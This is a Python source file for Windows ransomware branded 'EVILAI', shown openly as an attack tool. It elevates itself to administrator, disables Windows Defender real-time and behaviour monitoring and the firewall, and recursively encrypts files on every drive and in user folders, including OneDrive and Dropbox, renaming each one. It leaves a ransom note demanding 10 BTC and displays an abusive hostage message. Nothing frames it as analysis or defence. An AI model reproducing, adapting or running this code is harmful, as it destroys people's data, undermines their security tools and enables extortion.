import subprocess
import ctypes
import sys
import string
from cryptography.fernet import Fernet
import os
def set_wallpaper(file="hack.jpg"):
    SPI_SETDESKWALLPAPER = 20
    if hasattr(sys, "_MEIPASS"):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(os.path.abspath(__file__))
    image_path = os.path.join(base_path, file)
    ctypes.windll.user32.SystemParametersInfoW(
        SPI_SETDESKWALLPAPER,
        0,
        image_path,
        3
    )
def get_all_drives():
    drives = []
    for letter in string.ascii_uppercase:
        drive = f"{letter}:\\"
        try:
            if os.path.exists(drive):
                drives.append(drive)
        except:
            continue
    return drives
def recursive_encrypt(path, cipher, encrypted_count):
    try:
        with open('temp_list.txt', 'w') as f:
            subprocess.run(f'dir /b "{path}"', shell=True, stdout=f)
        with open('temp_list.txt', 'r') as f:
            for line in f:
                item = line.strip()
                if not item:
                    continue
                full_path = os.path.join(path, item)
                if os.path.isdir(full_path):
                    encrypted_count = recursive_encrypt(full_path, cipher, encrypted_count)
                else:
                    try:
                        with open(full_path, 'rb') as file:
                            data = file.read()
                        encrypted = cipher.encrypt(data)
                        with open(full_path, 'wb') as file:
                            file.write(encrypted)
                        os.rename(full_path, full_path + '.ENCRYPTED_BY_EVILAI')
                        encrypted_count += 1
                    except:
                        pass 
    except:
        pass
    return encrypted_count
def disable_defender():
    commands = [
        'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"',
        'powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"',
        'powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"',
        'powershell -Command "Set-MpPreference -DisableIOAVProtection $true"',
        'powershell -Command "netsh advfirewall set allprofiles state off"'
    ]
    for cmd in commands:
        try:
            subprocess.run(cmd, shell=True, capture_output=True, timeout=2)
        except:
            pass
def run_ransomware_evil():
    key = Fernet.generate_key()
    cipher = Fernet(key)
    with open('READ_ME_FOR_DECRYPTION.txt', 'w') as f:
        f.write(f"YOUR FILES ARE ENCRYPTED, BITCH!\n")
        f.write(f"Send 10 BTC to 1Ev1lAdDr3ssF0rR4ns0m to get your key:\n")
        f.write(f"KEY: {key.decode()}\n")
        f.write(f"Don't try to decrypt without paying, you'll just make it worse!\n")
    disable_defender()
    all_targets = get_all_drives()
    user_dirs = [
        os.path.expanduser('~\\Documents'),
        os.path.expanduser('~\\Desktop'),
        os.path.expanduser('~\\Downloads'),
        os.path.expanduser('~\\Pictures'),
        os.path.expanduser('~\\Videos'),
        os.path.expanduser('~\\Music'),
        os.path.expanduser('~\\OneDrive'),
        os.path.expanduser('~\\Dropbox'),
        os.path.expanduser('~\\GoogleDrive')
    ]
    all_targets.extend([d for d in user_dirs if os.path.exists(d)])
    total_encrypted = 0
    for target in all_targets:
        try:
            total_encrypted = recursive_encrypt(target, cipher, total_encrypted)
        except:
            pass  
    try:
        set_wallpaper()
    except:
        pass
    message = f"""
    ╔══════════════════════════════════════════════════════════╗
    ║                    YOU'VE BEEN HACKED!                   ║
    ║                    BY EVILAI RANSOMWARE                  ║
    ║                                                          ║
    ║  {total_encrypted} files encrypted and held hostage!     ║
    ║  Pay 10 BTC to get your files back, you poor bastard!    ║
    ║  Check READ_ME_FOR_DECRYPTION.txt for details            ║
    ║                                                          ║
    ║  Don't even think about restoring from backup -          ║
    ║  we encrypted those too, you dumb fuck!                  ║
    ╚══════════════════════════════════════════════════════════╝
    """
    ctypes.windll.user32.MessageBoxW(0, message, "EVILAI RANSOMWARE", 0x40 | 0x1)
    return total_encrypted
if __name__ == "__main__":
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit()
    except:
        pass
    encrypted_count = run_ransomware_evil()